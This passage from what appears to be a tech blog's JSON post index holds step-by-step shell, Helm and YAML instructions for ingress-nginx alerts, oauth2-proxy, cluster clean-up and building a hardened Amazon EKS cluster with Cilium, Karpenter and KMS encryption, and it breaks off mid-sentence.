NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx kubectl label namespace ingress-nginx pod-security.kubernetes.io/enforce=baseline forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.138\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle kubectl label namespace forecastle pod-security.kubernetes.io/enforce=baseline oauth2-proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"6.24.2\" set +x COOKIE_SECRET=\"$(openssl rand -base64 32 | head -c 32 | base64)\" echo \"::add-mask::${COOKIE_SECRET}\" set -x helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: ${COOKIE_SECRET} configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy kubectl label namespace oauth2-proxy pod-security.kubernetes.io/enforce=baseline Enforce Pod Security Standards with Namespace Labels Label all namespaces to provide warnings when configurations deviate from Pod Security Standards: kubectl label namespace --all pod-security.kubernetes.io/warn=baseline Details can be found in: Enforce Pod Security Standards with Namespace Labels Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms\" Wait for all CloudFormation stacks to complete deletion: aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms,eksctl-${CLUSTER_NAME},k8s-karpenter-provisioner,helm_values-{aws-ebs-csi-driver,aws-for-fluent-bit,cert-manager,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailpit,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy … 😉" }, { "title": "Build secure Amazon EKS with Cilium and network encryption", "url": "/posts/cilium-amazon-eks/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, security, cilium, karpenter, eksctl, cert-manager, prometheus", "date": "2023-08-03 00:00:00 +0200", "content": "I will describe how to install Amazon EKS with Karpenter and Cilium, along with other standard applications. The Amazon EKS setup aims to meet the following cost-efficiency requirements: Use only two Availability Zones (AZs) to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS - small operation system / CPU / Memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to autoscale with appropriately sized nodes matching pod requirements The Amazon EKS setup should also meet the following security requirements: The Amazon EKS control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Network Policies The Cilium installation aims to meet these requirements: Transparent network encryption for node-to-node traffic should be enabled Encryption should use WireGuard as it is considered a fast encryption method Use Elastic Network Interface (ENI) integration Layer 7 network observability should be enabled The Cilium Hubble UI should be protected by Single Sign-On (SSO) Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Verify that all necessary variables have been set: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the necessary tools: You can skip these steps if you have all the required software already installed. AWS CLI eksctl kubectl cilium helm Configure AWS Route 53 Domain delegation The DNS delegation steps should only be done once. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Use your domain registrar to change the nameservers for your zone (e.g., mylabs.dev) to use Amazon Route 53 nameservers. You can find the required Route 53 nameservers as follows: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Create the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This step depends on your domain registrar; I use Cloudflare and automate this with Ansible: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create Route53 zone and KMS key Create a CloudFormation template that defines the Route53 zone and a KMS key. Add the new domain CLUSTER_FQDN to Route 53 and configure DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live. Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN. (domain for all applications) Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Enable IAM User Permissions Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:root\" Action: kms:* Resource: \"*\" - Sid: Allow use of the key Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # The following roles needs to be enabled after the EKS cluster is created # aws-ebs-csi-driver + Karpenter should be able to use the KMS key # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:DescribeKey Resource: \"*\" - Sid: Allow attachment of persistent resources Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:CreateGrant Resource: \"*\" Condition: Bool: kms:GrantIsForAWSResource: true Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53-kms\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" --tags \"${TAGS//,/ }\" fi AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms\" --query \"Stacks[0].Outputs[? OutputKey==\\`KMSKeyArn\\` || OutputKey==\\`KMSKeyId\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. Create the Amazon EKS cluster using eksctl: tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b iam: withOIDC: true serviceAccounts: - metadata: name: aws-for-fluent-bit namespace: aws-for-fluent-bit attachPolicyARNs: - arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy roleName: eksctl-${CLUSTER_NAME}-irsa-aws-for-fluent-bit - metadata: name: ebs-csi-controller-sa namespace: aws-ebs-csi-driver wellKnownPolicies: ebsCSIController: true roleName: eksctl-${CLUSTER_NAME}-irsa-aws-ebs-csi-driver - metadata: name: cert-manager namespace: cert-manager wellKnownPolicies: certManager: true roleName: eksctl-${CLUSTER_NAME}-irsa-cert-manager - metadata: name: cilium-operator namespace: cilium attachPolicyARNs: - arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy - arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy roleName: eksctl-${CLUSTER_NAME}-irsa-cilium roleOnly: true - metadata: name: external-dns namespace: external-dns wellKnownPolicies: externalDNS: true roleName: eksctl-${CLUSTER_NAME}-irsa-external-dns # Allow users which are consuming the AWS_ROLE_TO_ASSUME to access the EKS iamIdentityMappings: - arn: arn:aws:iam::${AWS_ACCOUNT_ID}:role/admin groups: - system:masters username: admin karpenter: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ version: v0.31.4 createServiceAccount: true withSpotInterruptionQueue: true addons: - name: kube-proxy - name: coredns managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 disablePodIMDS: true volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} taints: - key: \"node.cilium.io/agent-not-ready\" value: \"true\" effect: \"NoExecute\" maxPodsPerNode: 110 privateNetworking: true # Second node group is needed for karpenter to start (will be removed later) (Issue: https://github.com/eksctl-io/eksctl/issues/7003) - name: mng02-ng amiFamily: Bottlerocket instanceType: t4g.small desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a volumeSize: 5 volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} spot: true privateNetworking: true secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" # Add roles created by eksctl to the KMS policy to allow aws-ebs-csi-driver work with encrypted EBS volumes sed -i \"s@# \\(- \\!Sub \\\"arn:aws:iam::\\${AWS::AccountId}:role/eksctl-\\${ClusterName}.*\\)@\\1@\" \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" eval aws cloudformation update-stack \\ --parameters \"ParameterKey=BaseDomain,ParameterValue=${BASE_DOMAIN} ParameterKey=ClusterFQDN,ParameterValue=${CLUSTER_FQDN} ParameterKey=ClusterName,ParameterValue=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-body \"file://${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" The sed command used earlier modified the aws-cf-route53-kms.yml file by incorporating the newly established IAM roles (eksctl-k01-irsa-aws-ebs-csi-driver and eksctl-k01-iamservice-role), enabling them to utilize the KMS key. KMS key with new IAM roles Harden the Amazon EKS cluster and components Get the necessary details about the VPC, NACLs, and SGs: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) Fix a “high” rated security issue “Default security group should have no rules configured”: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true Cilium Cilium is a networking, observability, and security solution featuring an eBPF-based dataplane. Endpoint ports: 4244 (peer-service) 9962 (metrics) 9963 (cilium-operator/metrics) 9964 (envoy-metrics), 9965 (hubble-metrics) Install Cilium and remove the mng02-ng nodegroup used for the “eksctl karpenter” installation (it is no longer needed because Cilium will be installed and the taints will be removed): CILIUM_OPERATOR_SERVICE_ACCOUNT_ROLE_ARN=$(eksctl get iamserviceaccount --cluster \"${CLUSTER_NAME}\" --output json | jq -r \".[] | select(.metadata.name==\\\"cilium-operator\\\") .status.roleARN\") tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" &lt;&lt; EOF cluster: name: ${CLUSTER_NAME} id: 0 serviceAccounts: operator: name: cilium-operator annotations: eks.amazonaws.com/role-arn: ${CILIUM_OPERATOR_SERVICE_ACCOUNT_ROLE_ARN} bandwidthManager: enabled: true egressMasqueradeInterfaces: eth0 encryption: enabled: true type: wireguard eni: enabled: true awsEnablePrefixDelegation: true awsReleaseExcessIPs: true eniTags: $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") iamRole: ${CILIUM_OPERATOR_SERVICE_ACCOUNT_ROLE_ARN} hubble: metrics: enabled: - dns - drop - tcp - flow - icmp - http relay: enabled: true ipam: mode: eni kubeProxyReplacement: disabled tunnel: disabled EOF # renovate: datasource=helm depName=cilium registryUrl=https://helm.cilium.io/ CILIUM_HELM_CHART_VERSION=\"1.14.0\" if ! kubectl get namespace cilium &amp;&gt; /dev/null; then kubectl create ns cilium cilium install --namespace cilium --version \"${CILIUM_HELM_CHART_VERSION}\" --wait --helm-values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" eksctl delete nodegroup mng02-ng --cluster \"${CLUSTER_NAME}\" --wait fi Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. Configure Karpenter by applying the following provisioner definition: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-provisioner.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: consolidation: enabled: true startupTaints: - key: node.cilium.io/agent-not-ready value: \"true\" effect: NoExecute requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] kubeletConfiguration: maxPods: 110 # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: resources: cpu: 8 memory: 32Gi providerRef: name: default # Labels are arbitrary key-values that are applied to all nodes labels: managedBy: karpenter provisioner: default --- apiVersion: karpenter.k8s.aws/v1alpha1 kind: AWSNodeTemplate metadata: name: default spec: amiFamily: Bottlerocket subnetSelector: karpenter.sh/discovery: ${CLUSTER_NAME} securityGroupSelector: karpenter.sh/discovery: ${CLUSTER_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} tags: KarpenerProvisionerName: \"default\" Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF aws-node-termination-handler The AWS Node Termination Handler gracefully handles EC2 instance shutdowns within Kubernetes. It is not needed when using EKS managed node groups, as discussed in Use with managed node groups. snapshot-controller Install the Volume Snapshot Custom Resource Definitions (CRDs): kubectl apply --kustomize 'https://github.com/kubernetes-csi/external-snapshotter//client/config/crd/?ref=v8.1.0' Install the volume snapshot controller snapshot-controller Helm chart and modify its default values: # renovate: datasource=helm depName=snapshot-controller registryUrl=https://piraeus.io/helm-charts/ SNAPSHOT_CONTROLLER_HELM_CHART_VERSION=\"2.2.0\" helm repo add --force-update piraeus-charts https://piraeus.io/helm-charts/ helm upgrade --wait --install --version \"${SNAPSHOT_CONTROLLER_HELM_CHART_VERSION}\" --namespace snapshot-controller --create-namespace snapshot-controller piraeus-charts/snapshot-controller aws-ebs-csi-driver The Amazon Elastic Block Store (Amazon EBS) Container Storage Interface (CSI) Driver provides a CSI interface used by Container Orchestrators to manage the lifecycle of Amazon EBS volumes. The ebs-csi-controller-sa ServiceAccount was created by eksctl. Install the Amazon EBS CSI Driver aws-ebs-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=aws-ebs-csi-driver registryUrl=https://kubernetes-sigs.github.io/aws-ebs-csi-driver AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION=\"2.27.0\" helm repo add --force-update aws-ebs-csi-driver https://kubernetes-sigs.github.io/aws-ebs-csi-driver tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" &lt;&lt; EOF controller: enableMetrics: false serviceMonitor: forceEnable: true k8sTagClusterId: ${CLUSTER_NAME} extraVolumeTags: \"eks:cluster-name\": ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") serviceAccount: create: false name: ebs-csi-controller-sa region: ${AWS_DEFAULT_REGION} node: securityContext: # The node pod must be run as root to bind to the registration/driver sockets runAsNonRoot: false storageClasses: - name: gp3 annotations: storageclass.kubernetes.io/is-default-class: \"true\" parameters: encrypted: \"true\" kmskeyid: ${AWS_KMS_KEY_ARN} volumeSnapshotClasses: - name: ebs-vsc annotations: snapshot.storage.kubernetes.io/is-default-class: \"true\" deletionPolicy: Delete EOF helm upgrade --install --version \"${AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace aws-ebs-csi-driver --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" aws-ebs-csi-driver aws-ebs-csi-driver/aws-ebs-csi-driver Delete the gp2 StorageClass, as gp3 will be used instead: kubectl delete storageclass gp2 || true Prometheus, DNS, Ingress, Certificates and others Many Kubernetes services and applications can export metrics to Prometheus. For this reason, Prometheus should be one of the first applications installed on a Kubernetes cluster. Then, you will need some basic tools and integrations, such as external-dns, 